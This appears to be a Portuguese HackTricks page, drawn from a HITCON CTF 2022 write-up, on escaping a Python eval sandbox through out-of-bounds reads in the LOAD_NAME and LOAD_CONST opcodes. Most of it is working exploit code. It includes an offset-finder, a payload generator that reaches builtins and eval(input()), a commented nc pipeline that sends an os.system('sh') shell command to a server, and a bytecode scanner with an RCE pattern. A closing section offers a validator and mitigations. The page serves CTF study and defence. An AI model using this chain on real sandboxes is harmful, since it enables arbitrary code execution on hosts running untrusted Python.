# LOAD_NAME / LOAD_CONST opcode OOB Read

{{#include ../../../banners/hacktricks-training.md}}

**Estas informações foram obtidas** [**deste writeup**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**<sup>[[1]](#references)</sup>

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

Podemos usar o recurso de leitura OOB no opcode LOAD_NAME / LOAD_CONST para obter algum símbolo na memória. Isso significa usar um truque como `(a, b, c, ... hundreds of symbol ..., __getattribute__) if [] else [].__getattribute__(...)` para obter um símbolo (como o nome de uma função) que você deseja.

Em seguida, basta criar seu exploit.

### Visão geral <a href="#overview-1" id="overview-1"></a>

O código-fonte é bastante curto e contém apenas 4 linhas!
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))1234
```
Você pode inserir código Python arbitrário, que será compilado em um [Python code object](https://docs.python.org/3/c-api/code.html). No entanto, `co_consts` e `co_names` desse code object serão substituídos por uma tupla vazia antes de esse code object ser avaliado.

Dessa forma, todas as expressões que contêm consts (por exemplo, números, strings etc.) ou names (por exemplo, variáveis, funções) podem causar um segmentation fault no final.

### Out of Bound Read <a href="#out-of-bound-read" id="out-of-bound-read"></a>

Como o segfault acontece?

Vamos começar com um exemplo simples: `[a, b, c]` poderia ser compilado no seguinte bytecode.
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE12345
```
Mas e se o `co_names` se tornar uma tupla vazia? O opcode `LOAD_NAME 2` ainda será executado e tentará ler o valor do endereço de memória onde ele originalmente deveria estar. Sim, isso é uma "feature" de leitura fora dos limites (out-of-bound read).

O conceito central da solução é simples. Alguns opcodes do CPython, como `LOAD_NAME` e `LOAD_CONST`, são vulneráveis (?) a OOB read.

Eles recuperam um objeto do índice `oparg` da tupla `consts` ou `names` (é assim que `co_consts` e `co_names` são nomeados internamente). Podemos consultar o seguinte pequeno snippest sobre `LOAD_CONST` para ver o que o CPython faz ao processar o opcode `LOAD_CONST`.
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}1234567
```
Dessa forma, podemos usar o recurso OOB para obter um "name" de um offset arbitrário da memória. Para garantir qual name ele possui e qual é seu offset, basta continuar tentando `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... E você poderá encontrar algo em torno de oparg > 700. Você também pode tentar usar o gdb para examinar o layout da memória, é claro, mas não acho que isso seria mais fácil?

### Gerando o Exploit <a href="#generating-the-exploit" id="generating-the-exploit"></a>

Depois de recuperarmos esses offsets úteis para names / consts, como _obtemos_ um name / const a partir desse offset e o utilizamos? Aqui está um truque para você:\
Vamos supor que possamos obter um name `__getattribute__` a partir do offset 5 (`LOAD_NAME 5`) com `co_names=()`. Nesse caso, basta fazer o seguinte:
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]1234
```
> Observe que não é necessário nomeá-lo como `__getattribute__`; você pode nomeá-lo com algo mais curto ou mais estranho

Você pode entender o motivo apenas visualizando seu bytecode:
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE1234567891011121314
```
Observe que `LOAD_ATTR` também recupera o nome de `co_names`. O Python carrega nomes a partir do mesmo offset quando o nome é igual, portanto o segundo `__getattribute__` ainda é carregado a partir de offset=5. Usando esse recurso, podemos usar qualquer nome assim que ele estiver na memória próxima.

Para gerar números, deve ser trivial:

- 0: not \[\[]]
- 1: not \[]
- 2: (not \[]) + (not \[])
- ...

### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>

Não usei consts devido ao limite de comprimento.

Primeiro, aqui está um script para encontrarmos esses offsets dos nomes.
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
```
E o seguinte é para gerar o exploit real em Python.
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
Ele basicamente faz as seguintes coisas; para essas strings, nós as obtemos do método `__dir__`:
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
---

### Notas de versão e opcodes afetados (Python 3.11–3.13)

- Os opcodes de bytecode do CPython ainda indexam as tuplas `co_consts` e `co_names` usando operandos inteiros. Se um atacante puder forçar essas tuplas a ficarem vazias (ou menores que o índice máximo usado pelo bytecode), o interpretador lerá memória fora dos limites para esse índice, obtendo um ponteiro PyObject arbitrário da memória próxima. Os opcodes relevantes incluem pelo menos:
- `LOAD_CONST consti` → lê `co_consts[consti]`.
- `LOAD_NAME namei`, `STORE_NAME`, `DELETE_NAME`, `LOAD_GLOBAL`, `STORE_GLOBAL`, `IMPORT_NAME`, `IMPORT_FROM`, `LOAD_ATTR`, `STORE_ATTR` → leem nomes de `co_names[...]` (para 3.11+, observe que `LOAD_ATTR`/`LOAD_GLOBAL` armazenam bits de flag no bit menos significativo; o índice real é `namei >> 1`). Consulte a documentação do disassembler para obter a semântica exata de cada versão. [Python dis docs].<sup>[[2]](#references)</sup>
- O Python 3.11+ introduziu caches adaptativos/inline que adicionam entradas `CACHE` ocultas entre as instruções. Isso não altera a primitiva OOB; apenas significa que, se você criar bytecode manualmente, deverá levar essas entradas de cache em consideração ao construir `co_code`.

Implicação prática: a técnica nesta página continua funcionando no CPython 3.11, 3.12 e 3.13 quando você consegue controlar um code object (por exemplo, via `CodeType.replace(...)`) e reduzir `co_consts`/`co_names`.

### Scanner rápido para índices OOB úteis (compatível com 3.11+/3.12+)

Se preferir procurar objetos interessantes diretamente a partir do bytecode, em vez de usar código-fonte de alto nível, você pode gerar code objects mínimos e testar índices por força bruta. O helper abaixo insere automaticamente os inline caches quando necessário.
```python
import dis, types

def assemble(ops):
# ops: list of (opname, arg) pairs
cache = bytes([dis.opmap.get("CACHE", 0), 0])
out = bytearray()
for op, arg in ops:
opc = dis.opmap[op]
out += bytes([opc, arg])
# Python >=3.11 inserts per-opcode inline cache entries
ncache = getattr(dis, "_inline_cache_entries", {}).get(opc, 0)
out += cache * ncache
return bytes(out)

# Reuse an existing function's code layout to simplify CodeType construction
base = (lambda: None).__code__

# Example: probe co_consts[i] with LOAD_CONST i and return it
# co_consts/co_names are intentionally empty so LOAD_* goes OOB

def probe_const(i):
code = assemble([
("RESUME", 0),          # 3.11+
("LOAD_CONST", i),
("RETURN_VALUE", 0),
])
c = base.replace(co_code=code, co_consts=(), co_names=())
try:
return eval(c)
except Exception:
return None

for idx in range(0, 300):
obj = probe_const(idx)
if obj is not None:
print(idx, type(obj), repr(obj)[:80])
```
Notas
- Para sondar names em vez disso, troque `LOAD_CONST` por `LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR` e ajuste o uso da stack de acordo.
- Use `EXTENDED_ARG` ou múltiplos bytes de `arg` para alcançar índices >255, se necessário. Ao construir com `dis` como acima, você controla apenas o byte inferior; para índices maiores, construa os bytes brutos manualmente ou divida o ataque entre vários loads.

### Padrão mínimo de RCE apenas com bytecode (co_consts OOB → builtins → eval/input)

Depois de identificar um índice de `co_consts` que resolve para o módulo builtins, você pode reconstruir `eval(input())` sem nenhum `co_names`, manipulando a stack:
```python
# Build co_code that:
# 1) LOAD_CONST <builtins_idx> → push builtins module
# 2) Use stack shuffles and BUILD_TUPLE/UNPACK_EX to peel strings like 'input'/'eval'
#    out of objects living nearby in memory (e.g., from method tables),
# 3) BINARY_SUBSCR to do builtins["input"] / builtins["eval"], CALL each, and RETURN_VALUE
# This pattern is the same idea as the high-level exploit above, but expressed in raw bytecode.
```
Essa abordagem é útil em challenges que fornecem controle direto sobre `co_code` enquanto forçam `co_consts=()` e `co_names=()` (por exemplo, “awpcode” do BCTF 2024). Ela evita tricks no nível do source e mantém o tamanho do payload pequeno ao aproveitar bytecode stack ops e tuple builders.

### Verificações defensivas e mitigações para sandboxes

Se você estiver escrevendo um “sandbox” Python que compila/avalia código não confiável ou manipula code objects, não dependa do CPython para verificar os limites dos índices de tuplas usados pelo bytecode. Em vez disso, valide os code objects por conta própria antes de executá-los.

Validador prático (rejeita acesso OOB a co_consts/co_names)
```python
import dis

def max_name_index(code):
max_idx = -1
for ins in dis.get_instructions(code):
if ins.opname in {"LOAD_NAME","STORE_NAME","DELETE_NAME","IMPORT_NAME",
"IMPORT_FROM","STORE_ATTR","LOAD_ATTR","LOAD_GLOBAL","DELETE_GLOBAL"}:
namei = ins.arg or 0
# 3.11+: LOAD_ATTR/LOAD_GLOBAL encode flags in the low bit
if ins.opname in {"LOAD_ATTR","LOAD_GLOBAL"}:
namei >>= 1
max_idx = max(max_idx, namei)
return max_idx

def max_const_index(code):
return max([ins.arg for ins in dis.get_instructions(code)
if ins.opname == "LOAD_CONST"] + [-1])

def validate_code_object(code: type((lambda:0).__code__)):
if max_const_index(code) >= len(code.co_consts):
raise ValueError("Bytecode refers to const index beyond co_consts length")
if max_name_index(code) >= len(code.co_names):
raise ValueError("Bytecode refers to name index beyond co_names length")

# Example use in a sandbox:
# src = input(); c = compile(src, '<sandbox>', 'exec')
# c = c.replace(co_consts=(), co_names=())       # if you really need this, validate first
# validate_code_object(c)
# eval(c, {'__builtins__': {}})
```
Ideias adicionais de mitigação
- Não permita `CodeType.replace(...)` arbitrário em input não confiável ou adicione verificações estruturais rigorosas ao code object resultante.
- Considere executar código não confiável em um processo separado com sandboxing no nível do sistema operacional (seccomp, job objects, containers) em vez de depender da semântica do CPython.

## Referências

- [1] [writeup de Splitline sobre o HITCON CTF 2022 "V O I D" (origem desta técnica e exploit chain de alto nível)](https://blog.splitline.tw/hitcon-ctf-2022/)
- [2] [Documentação do disassembler do Python (semântica dos índices para LOAD_CONST/LOAD_NAME/etc. e flags de low-bit de `LOAD_ATTR`/`LOAD_GLOBAL` no 3.11+)](https://docs.python.org/3.13/library/dis.html)

{{#include ../../../banners/hacktricks-training.md}}
